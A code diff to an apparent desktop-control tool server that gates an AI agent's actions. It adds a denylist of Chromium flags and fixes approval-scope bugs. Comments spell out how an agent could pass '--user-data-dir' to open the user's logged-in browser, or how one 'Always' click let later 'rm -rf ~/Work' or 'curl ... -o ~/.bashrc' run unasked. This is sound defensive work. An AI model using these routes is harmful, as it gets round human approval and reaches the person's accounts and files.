@@ -900,6 +900,58 @@ function exeOf(pid: number): string {
   return exe
 }
 
+/**
+ * Launch arguments that change WHICH program this is, rather than what it opens.
+ *
+ * desktop_launch built its command by concatenation -- entry.command plus
+ * whatever the caller passed -- and the shipped policy sets "args": true on the
+ * browser so it can open at a URL. Chromium picks its profile from a flag, so
+ * that also permitted:
+ *
+ *   desktop_launch browser --user-data-dir=~/.config/chromium
+ *
+ * which opens the person's real, fully logged-in browser. The agent then needs
+ * no browser tool at all: the result is an ordinary window of class chromium,
+ * which the app rules match with "*": "allow", so screenshot, type and key all
+ * work on it. That is the entire "its own empty profile, none of your logins"
+ * property -- the property that makes capabilities.browser safe to enable --
+ * removed by one argument.
+ *
+ * Refused here rather than in the policy, for the reason SELF_CONTROL exists:
+ * "args": true is a rule in the file being protected, and the person who sets
+ * it is asking to pass a URL, not to re-point the profile.
+ *
+ * --class and --app-id are here too: a window's class is what the app rules
+ * match on, so choosing it is choosing your own permissions.
+ */
+const LAUNCH_FORBIDDEN = [
+  "--user-data-dir", "--profile-directory", "--disk-cache-dir",
+  "--remote-debugging-port", "--remote-debugging-pipe", "--remote-allow-origins",
+  "--load-extension", "--disable-extensions-except",
+  "--disable-web-security", "--allow-running-insecure-content",
+  "--ignore-certificate-errors", "--no-sandbox", "--disable-gpu-sandbox",
+  "--proxy-server", "--proxy-pac-url", "--host-resolver-rules",
+  "--auth-server-allowlist", "--auth-server-whitelist",
+  "--class", "--app-id", "--name",
+  "--headless",
+]
+
+function checkLaunchArgs(app: string, argv: string[]): void {
+  for (const a of argv) {
+    const flag = a.split("=")[0]
+    if (LAUNCH_FORBIDDEN.includes(flag)) {
+      throw new Refused(
+        `REFUSED: "${flag}" is not an argument you may pass to a launched application.\n` +
+          "  It changes which program this is rather than what it opens -- the profile it\n" +
+          "  uses, the extensions it loads, the class it reports, or whether it opens a\n" +
+          "  debugging port. Those decide what you are allowed to do with the window.\n" +
+          `  Pass a URL or a path. For a browser you control, use desktop_browser_open,\n` +
+          "  which starts your own profile.",
+      )
+    }
+  }
+}
+
 const windowSubjects = (w: Win) => {
   const exe = exeOf(w.pid)
   return [
@@ -1451,7 +1503,19 @@ async function gate(
   if (d.action !== "ask") return
 
   const key = `${toolName}\u0000${scope}`
-  if (sessionAlways.has(key)) return
+  // A remembered "always" must not outrank the floor.
+  //
+  // This sat above the noYolo guard below, so a scope in sessionAlways
+  // returned before NEVER_YOLO was ever consulted. Combined with the overlay
+  // offering "Always" on every card -- it decides from request.severity, and
+  // nothing sent one, so every request read as not-destructive -- one click on
+  // a routine-looking `rm /tmp/scratch` put cmd:rm in the set, and every later
+  // rm was silent. Including `rm -rf ~/Work`, because the scope carries the
+  // command name and not its arguments.
+  //
+  // The floor is the one thing meant to survive every convenience in this
+  // file, so it is consulted first.
+  if (!noYolo && sessionAlways.has(key)) return
 
   // YOLO promotes "ask" to "allow" and does nothing else. A "deny" from any
   // dimension has already thrown above, so no lease can reach a password
@@ -1489,6 +1553,12 @@ async function gate(
         scope,
         target: d.subject,
         reasons: d.reasons,
+          // The overlay withholds "Always" for a destructive request and had
+          // no way to know: it reads request.severity, and nothing ever sent
+          // one, so every card read as not-destructive. noYolo already means
+          // exactly "never auto-approve this" -- it is the answer the card
+          // needed all along.
+          severity: noYolo ? "destructive" : "normal",
       })
     } finally {
       awaitingApproval--
@@ -2781,6 +2851,7 @@ server.registerTool(
       )
     }
 
+    checkLaunchArgs(args.app, args.args ?? [])
     const cmd = [...entry.command, ...(args.args ?? [])]
     const ag = agentAction(policy, IDENTITY, "launch")
     const d: Decision = {
@@ -2796,7 +2867,12 @@ server.registerTool(
       d.action = "deny"
       d.reasons = ['policy "enabled" is false — desktop control is switched off']
     }
-    await gate("desktop_launch", "launch", d, error, `app:${args.app}`)
+    // The arguments are part of the scope.
+    //
+    // It was `app:${args.app}` alone, so "Always" on one ordinary browser
+    // launch permitted every later launch with any arguments at all -- a
+    // grant far wider than the card that produced it showed.
+    await gate("desktop_launch", "launch", d, error, `app:${args.app} ${(args.args ?? []).join(" ")}`.trim())
 
     const before = new Set((await windows()).map((w) => w.address))
     // Placed, not requested. onWorkspace returns the argv unchanged when
@@ -3278,7 +3354,10 @@ server.registerTool(
       "run",
       d,
       error,
-      `cmd:${base}`,
+      // Arguments included for the same reason as desktop_launch: "Always" on
+      // `curl https://example.com/status` should not silently cover
+      // `curl https://elsewhere -o ~/.bashrc`.
+      `cmd:${base} ${argv.join(" ")}`.trim(),
       // Checked across every token for the same reason: a lease must not
       // promote "timeout 10 rm -rf ..." just because the first word is benign.
       (() => {
